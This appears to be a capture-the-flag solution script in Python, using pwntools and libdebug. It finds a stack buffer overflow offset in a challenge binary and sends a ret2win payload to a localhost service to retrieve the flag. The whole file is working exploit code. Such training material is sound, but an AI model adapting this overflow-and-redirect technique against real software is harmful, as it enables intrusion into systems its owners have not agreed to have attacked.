#!/usr/bin/env python3

import sys
from libdebug import debugger
from pwn import *

HOST = 'localhost'
PORT = 50000

context(arch='amd64', os='linux')

def get_offset():
    d = debugger("./container/chall")
    io = d.run()

    catcher = d.catch_signal('SIGSEGV')
    d.cont()
    io.recvuntil(b'Vad heter du?')

    payload = cyclic(0x100-1)
    io.sendline(payload)

    d.wait()
    if not catcher.hit_on(d):
        log.error('Test program did not segfault. Can not find offset')
        return None

    retaddr = d.memory[d.regs.rsp, 4]
    offset = cyclic_find(retaddr)
    return offset

def exploit(offset):
    elf = ELF('./container/chall')
    io = remote(HOST, PORT)

    io.recvuntil(b'Vad heter du?')
    payload = b'A'*offset
    payload += p64(elf.symbols['win'])
    io.sendline(payload)
    io.recvline_contains(b'Hej ')
    flag = io.recvline().decode().strip()
    return flag

def main():
    offset = get_offset()
    log.info('Offset: %#x', offset)
    flag = exploit(offset)
    log.info('Flag: %s', flag)
    return 0

if __name__ == '__main__':
    sys.exit(main())
